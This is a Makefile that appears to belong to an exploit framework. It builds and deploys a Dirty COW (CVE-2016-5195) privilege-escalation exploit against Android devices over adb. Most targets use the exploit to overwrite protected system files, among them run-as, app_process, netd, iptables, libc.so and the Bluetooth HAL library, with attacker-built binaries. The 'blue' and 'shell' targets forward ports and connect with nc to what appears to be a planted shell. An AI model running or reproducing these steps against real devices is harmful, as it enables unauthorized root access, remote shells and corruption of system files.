
ARCH := $(shell adb shell getprop ro.product.cpu.abi)

all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_PLATFORM=android-16

install: build
	mv libs/armeabi-v7a/dirtycow ../../../../data/exploits/CVE-2016-5195.elf
	mv libs/armeabi-v7a/libsysutils.so ../../../../data/exploits/CVE-2016-5195.so

push: build
	adb push libs/$(ARCH)/dirtycow /data/local/tmp/dcow
	adb push test.sh /data/local/tmp/test.sh

testy: build
	adb push libs/$(ARCH)/dirtycow /data/local/tmp/dcow
	adb shell 'chmod 777 /data/local/tmp/dcow'
	adb shell '/data/local/tmp/dcow'

test: push
	adb shell 'chmod 777 /data/local/tmp/dcow'
	adb shell 'chmod 777 /data/local/tmp/test.sh'
	adb shell '/data/local/tmp/test.sh'
	adb shell '/data/local/tmp/dcow /data/local/tmp/test /data/local/tmp/test2'
	adb shell 'cat /data/local/tmp/test2'
	adb shell 'cat /data/local/tmp/test2' | xxd

apppush: push
	adb push libs/$(ARCH)/app_process /data/local/tmp/app_process

run: apppush
	adb shell '/data/local/tmp/dcow /data/local/tmp/app_process /system/bin/run-as'
	adb shell /system/bin/run-as

app: apppush
	adb shell '/data/local/tmp/dcow /data/local/tmp/app_process /system/bin/app_process'

restore:
	adb shell '/data/local/tmp/dcow /data/local/tmp/app_process_bak /system/bin/app_process'
	#adb shell '/data/local/tmp/dcow /data/local/tmp/libbinder.so.bak /system/lib/libbinder.so'
	#adb shell '/data/local/tmp/dcow /data/local/tmp/libcutils.so.bak /system/lib/libcutils.so'
	adb shell '/data/local/tmp/dcow /data/local/tmp/libsysutils.so.bak /system/lib/libsysutils.so'

backup:
	adb pull /system/bin/app_process
	adb pull /system/lib/libsysutils.so
	adb pull /system/lib/libcutils.so
	adb pull /system/lib/libbinder.so
	adb push app_process /data/local/tmp/app_process_bak
	adb push libsysutils.so /data/local/tmp/libsysutils.so.bak
	adb push libcutils.so /data/local/tmp/libcutils.so.bak
	adb push libbinder.so /data/local/tmp/libbinder.so.bak

tc:
	adb shell '/data/local/tmp/dcow /data/local/tmp/elf /system/bin/tc'

iptables:
	adb shell '/data/local/tmp/dcow /data/local/tmp/elf /system/bin/iptables6'
	adb shell '/data/local/tmp/dcow /data/local/tmp/elf /system/bin/iptables'

netd:
	adb shell '/data/local/tmp/dcow /data/local/tmp/elf /system/bin/netd'

blue: build
	adb push libs/$(ARCH)/libsysutils.so /data/local/tmp/libsysutils.so
	adb shell '/data/local/tmp/dcow /data/local/tmp/libsysutils.so /system/lib/hw/bluetooth.default.so'
	adb forward tcp:11112 tcp:11112
	nc -v localhost 11112

restoreblue:
	adb push bluetooth.default.so /data/local/tmp/libsysutils.so
	adb shell '/data/local/tmp/dcow /data/local/tmp/libsysutils.so /system/lib/hw/bluetooth.default.so'

binder: build
	#adb push libs/$(ARCH)/libsysutils.so /data/local/tmp/libsysutils.so
	adb shell '/data/local/tmp/dcow /data/local/tmp/libbinder.so /system/lib/libbinder.so'

sys: build
	adb push libs/$(ARCH)/libsysutils.so /data/local/tmp/libsysutils.so
	adb shell '/data/local/tmp/dcow /data/local/tmp/libsysutils.so /system/lib/libsysutils.so'

cutils: build
	adb push libs/$(ARCH)/libsysutils.so /data/local/tmp/libsysutils.so
	adb shell '/data/local/tmp/dcow /data/local/tmp/libsysutils.so /system/lib/libcutils.so'

patch: build
	#adb shell '/data/local/tmp/dcow /data/local/tmp/libsysutils.so /system/lib/libsysutils.so'
	adb push libsysutils.patched /data/local/tmp/libsysutils.patched
	adb shell '/data/local/tmp/dcow /data/local/tmp/libsysutils.patched /system/lib/libsysutils.so'

libc:
	adb push libc.so /data/local/tmp/
	adb shell '/data/local/tmp/dcow /data/local/tmp/libc.so /system/lib/libc.so'

shell:
	adb forward tcp:5001 tcp:5001
	nc -v localhost 5001

clean:
	rm -rf libs
	rm -rf obj

